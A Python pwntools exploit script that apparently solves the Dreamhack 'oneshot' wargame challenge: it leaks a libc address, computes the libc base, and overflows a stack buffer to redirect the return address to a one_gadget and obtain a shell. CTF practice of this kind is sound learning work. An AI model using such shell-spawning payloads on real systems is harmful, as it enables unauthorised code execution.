from pwn import *

# p = process('./oneshot')
p = remote('host3.dreamhack.games', 13943)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvline()[:-1], 16)
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
print(f'stdout: {hex(stdout_addr)}')
print(f'libc_base: {hex(libc_base)}')

one_gadget = libc_base + 0x45216
print(f'one_gadget: {hex(one_gadget)}')

p.recvuntil(b'MSG: ')
payload = b'A' * 0x18 + p64(0) + b'B' * 0x8 + p64(one_gadget)
p.sendline(payload)
p.interactive()


'''
sub rsp, 0x30
msg[0x10] <- rbp-0x20
dummy     <- rbp-0x10
SFP       <- rbp
RET       <- rbp+0x8
'''
